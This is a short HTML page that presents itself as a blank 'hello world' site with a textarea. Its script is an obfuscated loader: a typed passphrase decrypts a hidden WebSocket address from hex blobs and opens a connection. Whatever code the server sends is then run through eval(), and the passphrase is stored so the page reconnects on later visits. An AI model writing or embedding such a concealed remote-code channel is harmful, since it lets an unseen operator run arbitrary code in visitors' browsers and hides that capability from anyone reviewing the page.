<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui">
    <title>d0b3.github.io</title>
    <style>
      html, body { margin: 0; height: 100%; }
      body {
        display: flex;
        flex-flow: column;
        align-items: center;
        justify-content: center;
        background: #fefbf7;
        color: #a0bcc2;
      }
      textarea {
        width: 480px;
        height: 320px;
      }
    </style>
    <script type="module">

      await new Promise(r => addEventListener('DOMContentLoaded', r, { once: true }));

      async function sha (t) { return new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(t))); };
      async function dec (sock, salt, pass) {
    sock = new Uint8Array(sock.match(/.{2}/g).map(s=>parseInt(s, 16)));
    const flp = await sha(salt+pass+salt);
    for (let i = 0; i < sock.length; i++) sock[i] ^= flp[i%flp.length];
    try {
      const host = new TextDecoder().decode(sock.slice(32)).trim(),
            chk = await sha(host);
      for (let i = 0; i < chk.length; i++) if (chk[i] !== sock[i]) return;
      return 'ws'+host.slice(4)+'/'+[...flp].map(b=>b.toString(16).padStart(2,'0')).join('');
    } catch { }
  };

      const SOCK = ["ce9a41f7a6b2c3cc15c0b065cf367342f3345520748779377cdfef18ddf8cc53bd69dd4579b5bc5c81d8a8074b931969a271a66823beaf0a3a98dd7fe18f3e4cf32ed0062bfce8158ac5af1a16dd443fa46de46928baa20c27d0926cfe8e6705bd69dd","18f071a3523fc9c6abd831b93686dd227c65dfc1b0dcb965c3a9be6bc901d7756b03ed118d38b61e23c02dd8fb36b743387d7592eae66950c7a29d0ce963356d2c0eae43c46cff153ec73085b56be145243f7499eeeb6f4d8fed8e13e83a7c236b03ed"];

      const $ta = document.querySelector('textarea');
      try { $ta.value = localStorage.getItem('value') || ''; } catch { };

      $ta.onchange = $ta.onkeyup = async () => {
        const value = $ta.value.trim();
        if (!value) return;
        for (const sock of SOCK) {
          const url = await dec(sock, "whatever", value);
          if (url) {
            $ta.value = 'connecting';
            localStorage.setItem('value', value);
            const socket = new WebSocket(url);
            socket.binaryType = 'arraybuffer';
            socket.onmessage = ev => { eval(new TextDecoder().decode(ev.data))(socket); };
            socket.onerror = () => { $ta.value = 'vodafone m√ºde'; };
            return;
          }
        }
      };

      $ta.onchange();

    </script>
  </head>
  <body>
    <h1>hello world</h1>
    <textarea></textarea>
  </body>
</html>